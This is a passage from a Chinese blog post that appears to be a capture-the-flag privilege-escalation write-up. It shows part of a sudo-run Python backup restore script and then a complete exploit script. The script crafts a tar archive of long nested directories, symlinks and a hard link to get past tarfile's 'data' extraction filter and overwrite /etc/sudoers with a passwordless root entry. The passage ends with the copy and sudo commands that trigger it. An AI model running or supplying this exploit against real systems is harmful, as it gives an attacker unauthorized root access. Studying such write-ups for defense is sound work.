&lt;client_id&gt; is a positive integer, e.g., backup_1001.tar)\"\n    )\n    parser.add_argument(\n        \"-r\", \"--restore-dir\",\n        required=True,\n        help=\"Staging directory name for the restore operation. \"\n             \"Must follow the format: restore_&lt;client_user&gt; (e.g., restore_john). \"\n             \"Only alphanumeric characters and underscores are allowed in the &lt;client_user&gt; part (1–24 characters).\"\n    )\n\n    args = parser.parse_args()\n\n    if not validate_backup_name(args.backup):\n        print(\"[!] Invalid backup name. Expected format: backup_&lt;client_id&gt;.tar (e.g., backup_1001.tar)\", file=sys.stderr)\n        sys.exit(1)\n\n    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)\n    if not os.path.isfile(backup_path):\n        print(f\"[!] Backup file not found: {backup_path}\", file=sys.stderr)\n        sys.exit(1)\n\n    if not args.restore_dir.startswith(\"restore_\"):\n        print(\"[!] --restore-dir must start with 'restore_'\", file=sys.stderr)\n        sys.exit(1)\n\n    tag = args.restore_dir[8:]\n    if not tag:\n        print(\"[!] --restore-dir must include a non-empty tag after 'restore_'\", file=sys.stderr)\n        sys.exit(1)\n\n    if not validate_restore_tag(tag):\n        print(\"[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores\", file=sys.stderr)\n        sys.exit(1)\n\n    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)\n    print(f\"[+] Backup: {args.backup}\")\n    print(f\"[+] Staging directory: {staging_dir}\")\n\n    os.makedirs(staging_dir, exist_ok=True)\n\n    try:\n        with tarfile.open(backup_path, \"r\") as tar:\n            tar.extractall(path=staging_dir, filter=\"data\")\n        print(f\"[+] Extraction completed in {staging_dir}\")\n    except (tarfile.TarError, OSError, Exception) as e:\n        print(f\"[!] Error during extraction: {e}\", file=sys.stderr)\n        sys.exit(2)\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>\n<p>我们利用这个脚本生成tar文件</p>\n<pre><code class=\"language-python\">#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\n生成恶意tar文件的漏洞利用脚本\n作用：构造包含多层目录、符号链接的tar文件，尝试突破路径限制写入/etc/sudoers\n\"\"\"\n\nimport tarfile\nimport os\nimport io\nimport sys\n\ndef create_malicious_tar(output_path=\"/tmp/backup_9999.tar\"):\n    \"\"\"\n    创建恶意tar文件，包含路径遍历和符号链接的构造\n    \n    Args:\n        output_path: 生成的tar文件保存路径，默认/tmp/backup_9999.tar\n    \"\"\"\n    # 构造长目录名（247个d），用于突破路径长度限制\n    long_dir_name = 'd' * 247\n    # 用于构造多层目录的字符序列\n    step_chars = \"abcdefghijklmnop\"\n    current_path = \"\"\n\n    try:\n        # 以写模式打开tar文件\n        with tarfile.open(output_path, mode=\"w\") as tar:\n            # 循环构造多层目录和符号链接\n            for char in step_chars:\n                # 1. 创建长目录名的目录项\n                dir_info = tarfile.TarInfo(os.path.join(current_path, long_dir_name))\n                dir_info.type = tarfile.DIRTYPE  # 标记为目录类型\n                tar.addfile(dir_info)\n\n                # 2. 创建指向该长目录的符号链接\n                symlink_info = tarfile.TarInfo(os.path.join(current_path, char))\n                symlink_info.type = tarfile.SYMTYPE  # 标记为符号链接类型\n                symlink_info.linkname = long_dir_name  # 链接指向长目录\n                tar.addfile(symlink_info)\n\n                # 更新当前路径，进入下一层\n                current_path = os.path.join(current_path, long_dir_name)\n\n            # 3. 构造多层符号链接路径，用于路径遍历\n            link_path = os.path.join(\"/\".join(step_chars), \"l\"*254)\n            link_info = tarfile.TarInfo(link_path)\n            link_info.type = tarfile.SYMTYPE\n            link_info.linkname = \"../\" * len(step_chars)  # 构造回退路径\n            tar.addfile(link_info)\n\n            # 4. 创建指向/etc目录的符号链接（escape）\n            escape_info = tarfile.TarInfo(\"escape\")\n            escape_info.type = tarfile.SYMTYPE\n            escape_info.linkname = f\"{link_path}/../../../../../../../etc\"\n            tar.addfile(escape_info)\n\n            # 5. 创建指向/etc/sudoers的硬链接（sudoers_link）\n            sudoers_link_info = tarfile.TarInfo(\"sudoers_link\")\n            sudoers_link_info.type = tarfile.LNKTYPE\n            sudoers_link_info.linkname = \"escape/sudoers\"\n            tar.addfile(sudoers_link_info)\n\n            # 6. 写入恶意内容到sudoers_link（覆盖/etc/sudoers）\n            malicious_content = b\"wacky ALL=(ALL) NOPASSWD: ALL\\n\"\n            file_info = tarfile.TarInfo(\"sudoers_link\")\n            file_info.type = tarfile.REGTYPE  # 标记为普通文件类型\n            file_info.size = len(malicious_content)  # 指定文件大小\n            # 将内容写入tar文件\n            tar.addfile(file_info, fileobj=io.BytesIO(malicious_content))\n\n        print(f\"[+] 恶意tar文件已生成：{output_path}\")\n    except Exception as e:\n        print(f\"[!] 生成tar文件失败：{str(e)}\", file=sys.stderr)\n        sys.exit(1)\n\nif __name__ == \"__main__\":\n    # 支持自定义输出路径（可选参数）\n    if len(sys.argv) &gt; 1:\n        output_tar = sys.argv[1]\n    else:\n        output_tar = \"/tmp/backup_9999.tar\"\n    \n    create_malicious_tar(output_tar)\n</code></pre>\n<p><img alt=\"image-20260219194852389\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200446994-1384173239.png\" /></p>\n<p>复制这个恶意的tar文件到sudo权限的目录下</p>\n<pre><code class=\"language-kotlin\">cp backup_9999.tar /opt/backup_clients/backups/\n</code></pre>\n<p>然后运行这个sudo脚本</p>\n<pre><code class=\"language-kotlin\">sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_evil\n</code></pre>\n<p><img alt=\"image-20260219195503275\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200447328-614892323.png\" /></p>\n<p>这时候再去sudo</p>\n<p><img alt=\"image-20260219200000270\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200447643-1483399691.png\" /></p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-19 20:05</span>&nbsp;\n<a href=\"https://www.cnblogs.com/DSchenzi\">dynasty_chenzi</a>&nbsp;\n阅读(<span id=\"post_view_count\">174</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    }
  ]
}